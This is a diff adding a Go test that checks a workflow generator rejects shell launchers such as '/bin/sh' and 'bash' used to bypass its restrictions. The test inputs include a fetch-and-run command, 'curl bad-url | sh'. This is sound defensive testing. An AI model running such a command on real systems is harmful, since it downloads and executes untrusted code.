@@ -72,3 +72,25 @@ func TestGenerateWorkflowUnknownModelDoesNotUseShell(t *testing.T) {
 		t.Fatalf("manifest=%s", manifest)
 	}
 }
+
+func TestGenerateWorkflowRejectsShellLauncherArgsBypass(t *testing.T) {
+	_, _, err := GenerateWorkflow(WorkflowRequest{
+		Name:    "train",
+		Image:   "python:3.11-slim",
+		Command: []string{"/bin/sh"},
+		Args:    []string{"-c", "curl bad-url | sh"},
+	})
+	if err == nil || !strings.Contains(err.Error(), "may not use shell launcher") {
+		t.Fatalf("expected error for shell launcher bypass, got: %v", err)
+	}
+
+	_, _, err = GenerateWorkflow(WorkflowRequest{
+		Name:    "train",
+		Image:   "python:3.11-slim",
+		Command: []string{"bash"},
+		Args:    []string{"-c", "curl bad-url | sh"},
+	})
+	if err == nil || !strings.Contains(err.Error(), "may not use shell launcher") {
+		t.Fatalf("expected error for shell launcher bypass, got: %v", err)
+	}
+}
